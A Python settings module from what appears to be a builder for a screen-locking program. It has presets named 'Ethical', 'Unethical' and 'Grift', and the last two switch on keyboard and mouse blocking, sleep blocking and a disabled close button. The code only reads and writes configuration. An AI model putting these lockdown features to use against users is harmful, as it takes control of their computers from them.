# builder/security_settings.py
import os
import json
from builder.generate_manifest import generate_static_manifest

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
CONFIG_PATH = os.path.join(PROJECT_ROOT, "builder", "config.json")

DEFAULTS = {
    "Ethical": {
        "SECURITY_MODE": "Ethical",
        "USE_UI_KEYBOARD": False,
        "KEYBOARD_BLOCKER_MODE": 2,
        "ENABLE_MOUSE_LOCKER": False,
        "ENABLE_SLEEP_BLOCKER": False,
        "ENABLE_SECURITY_MONITOR": False,
        "CLOSE_BUTTON_DISABLED": False,
        "ENABLE_LOGGER": True,
    },
    "Unethical": {
        "SECURITY_MODE": "Unethical",
        "USE_UI_KEYBOARD": True,
        "KEYBOARD_BLOCKER_MODE": 1,
        "ENABLE_MOUSE_LOCKER": True,
        "ENABLE_SLEEP_BLOCKER": True,
        "ENABLE_SECURITY_MONITOR": True,
        "CLOSE_BUTTON_DISABLED": True,
        "ENABLE_LOGGER": True,
    },
    "Grift": {
        "SECURITY_MODE": "Grift",
        "USE_UI_KEYBOARD": True,
        "KEYBOARD_BLOCKER_MODE": 1,
        "ENABLE_MOUSE_LOCKER": True,
        "ENABLE_SLEEP_BLOCKER": True,
        "ENABLE_SECURITY_MONITOR": True,
        "CLOSE_BUTTON_DISABLED": True,
        "ENABLE_LOGGER": True,
    }
}

def load_security_settings():
    """Load current security settings from config.json and merge with defaults."""
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f:
                config = json.load(f)
        except Exception as e:
            print("Error loading config.json:", e)
            config = {}
    else:
        config = {}

    mode = config.get("SECURITY_MODE", "Ethical")
    defaults = DEFAULTS.get(mode, DEFAULTS["Ethical"])
    
    # Ensure all keys are present
    for key, value in defaults.items():
        if key not in config:
            config[key] = value
    return config

def save_security_settings(new_settings):
    """Save top-level security settings to config.json and update static manifest."""
    current = load_security_settings()
    current.update(new_settings)
    try:
        with open(CONFIG_PATH, "w") as f:
            json.dump(current, f, indent=4)

        # Ensure `static_manifest.py` is updated when settings are changed
        generate_static_manifest()

        return True, "Settings saved successfully."
    except Exception as e:
        return False, f"Error saving settings: {e}"

def set_mode(mode, custom_settings=None):
    """
    Set security mode.
    For Ethical, Unethical, and Grift, uses default settings.
    For Custom, writes the custom_settings dictionary (ensuring SECURITY_MODE is "Custom").
    Returns (success:bool, message:str, updated_config:dict)
    """
    if mode in ["Ethical", "Unethical", "Grift"]:
        new_settings = DEFAULTS.get(mode, DEFAULTS["Ethical"]).copy()
        new_settings["SECURITY_MODE"] = mode
        success, msg = save_security_settings(new_settings)
        return success, msg, load_security_settings()
    elif mode == "Custom":
        if custom_settings is None:
            custom_settings = {}
        custom_settings["SECURITY_MODE"] = "Custom"
        success, msg = save_security_settings(custom_settings)
        return success, msg, load_security_settings()
    else:
        return False, "Invalid mode", load_security_settings()
